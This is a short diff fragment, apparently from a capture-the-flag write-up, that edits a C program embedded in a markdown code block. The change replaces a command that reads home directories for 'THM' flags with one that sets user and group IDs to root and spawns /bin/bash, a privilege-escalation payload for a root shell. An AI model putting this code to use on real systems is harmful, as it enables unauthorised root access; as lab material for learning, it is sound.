@@ -389,7 +389,7 @@ int main()
 {
    setgid(0);
    setuid(0);
-   system("cat /home/* 2>/dev/null | grep THM");
+   system("/bin/bash");
 return 0;
 }
 ```
